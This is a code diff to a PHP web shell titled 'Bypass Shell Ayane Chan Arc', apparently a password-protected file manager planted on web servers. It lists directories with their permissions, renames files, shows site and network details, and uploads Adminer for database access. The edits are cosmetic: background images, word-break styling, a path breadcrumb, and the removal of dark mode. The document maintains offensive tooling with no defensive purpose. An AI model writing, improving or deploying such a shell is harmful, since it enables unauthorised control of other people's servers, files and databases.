@@ -32,6 +32,8 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
             display: flex;
             justify-content: center;
             align-items: center;
+            background-image: url("https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg");
+            background-size: cover;
         }
         .login-card {
             border-radius: 10px;
@@ -156,7 +158,7 @@ function display_path_links($dir) {
             $isRoot = $folderPath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . (strlen($folder) > 15 ? wordwrap($folder, 15, "<br>") : $folder) . "/</a>";
+            echo "<a href='?dir=$encodedPath' class='btn btn-link word-break'>" . wordwrap($folder, 15, '<br>', true) . "/</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
@@ -228,7 +230,7 @@ function display_path_links($dir) {
             $isRoot = $filePath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span>" . (strlen($file) > 15 ? wordwrap($file, 15, "<br>") : $file) . "</span>";
+            echo "<span class='word-break'>" . wordwrap($file, 15, '<br>', true) . "</span>";
             echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
@@ -525,6 +527,9 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
     <style>
         body {
             min-width: 1024px;
+            background-color: pink;
+            background-image: url('https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg');
+            background-size: cover;
         }
 
         .form-popup {
@@ -586,31 +591,12 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             background-color: #e2e3e5;
         }
 
-        .dark-mode {
-            background-color: #2c2c2c;
-            color: white;
-        }
-
-        .dark-mode a {
-            color: #17a2b8;
-        }
-
-        .dark-mode .btn {
-            background-color: #3a3a3a;
-            color: white;
-        }
-
-        .dark-mode .form-container {
-            background-color: #3a3a3a;
-        }
-
-        .dark-mode .alert {
-            background-color: #4a4a4a;
-            color: white;
+        .word-break {
+            word-break: break-word;
         }
     </style>
 </head>
-<body style="background-color: pink;">
+<body>
     <div class="container mt-5">
         <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
         <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
@@ -624,7 +610,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             <button class="btn btn-primary" onclick="toggleInfoSites()">Informasi Web</button>
             <button class="btn btn-secondary" onclick="toggleNetworkInfo()">Network Info</button>
             <button class="btn btn-info" onclick="showForm('adminer-upload')">Upload Adminer</button>
-            <button class="btn btn-warning" onclick="toggleDarkMode()">Tampilan</button>
         </div>
 
         <!-- Form Upload Adminer -->
@@ -669,6 +654,21 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         </form>
 
         <h2 class="mt-4">Daftar Direktori</h2>
+        <div class="alert alert-info">
+            <strong>Direktori Saat Ini:</strong> 
+            <?php
+            $currentPath = '/';
+            echo "<a href='?dir=" . urlencode(base64_encode('/')) . "' class='btn btn-link'>/</a> ";
+            foreach ($dirArray as $index => $folder) {
+                $currentPath .= htmlspecialchars($folder) . '/';
+                $encodedPath = urlencode(base64_encode($currentPath));
+                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
+                if ($index < count($dirArray) - 1) {
+                    echo " / ";
+                }
+            }
+            ?>
+        </div>
         <div class="list-group">
             <?php
             display_path_links($dir);
@@ -722,10 +722,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             } else {
                 input.style.display = "none";
             }
-        }
-
-        function toggleDarkMode() {
-            document.body.classList.toggle("dark-mode");
         }
     </script>
 </body>
